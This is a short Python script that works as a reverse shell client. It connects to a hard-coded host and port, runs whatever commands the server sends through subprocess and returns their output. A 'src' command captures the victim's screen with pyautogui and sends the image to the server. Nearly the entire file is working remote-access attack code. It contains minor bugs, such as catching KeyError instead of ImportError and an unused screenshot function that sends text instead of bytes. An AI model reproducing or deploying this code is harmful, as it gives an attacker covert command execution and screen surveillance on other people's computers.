import socket, os, subprocess, sys
import  io
import threading

try:
    import pyautogui
except KeyError:
    pyautogui_imported = False
else:
    pyautogui_imported = True




# SERVER_HOST = sys.argv[1]
SERVER_HOST = "192.168.43.236"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

print('hehe im a client')
s = socket.socket()
s.connect((SERVER_HOST,SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == 'exit':
        break
    if splited_command[0] == 'cd':
        try:
            os.chdir(' '.join(splited_command[1:]))
        except Exception as e:
            output = str(e)
        else:
            output = ""
    elif splited_command[0] == 'src':
        print('call take picture')
        screenshot = pyautogui.screenshot()
        # Convert screenshot to bytes
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_data = img_bytes.getvalue()
        s.sendall(f"{len(img_data)}{SEPARATOR}{'image'}".encode())
        s.sendall(img_data)
        output = ""

    else:
        output = subprocess.getoutput(command)

    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

def take_screenshot():
    screenshot = pyautogui.screenshot()
    # Convert screenshot to bytes
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_data = img_bytes.getvalue()
    s.sendall(f"{len(img_data).to_bytes(4, byteorder='big')}{SEPARATOR}{'image'}")




s.close()
